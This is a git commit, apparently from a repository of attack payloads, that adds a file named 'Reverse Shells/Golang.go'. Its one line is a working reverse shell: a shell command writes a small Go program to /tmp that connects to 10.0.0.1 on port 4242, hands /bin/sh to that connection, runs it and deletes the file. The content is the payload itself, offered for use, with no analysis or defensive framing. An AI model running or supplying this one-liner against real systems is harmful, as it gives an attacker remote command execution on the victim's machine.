b47fbc715d58f7b3a0c9ef126a7a54ecdbdaab01
Jake Garrison <101604552+wayahlife@users.noreply.github.com>
2022-10-07 15:58:43 -0600

    Create Golang.go

---
+++ Reverse Shells/Golang.go
@@ -0,0 +1,1 @@
+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
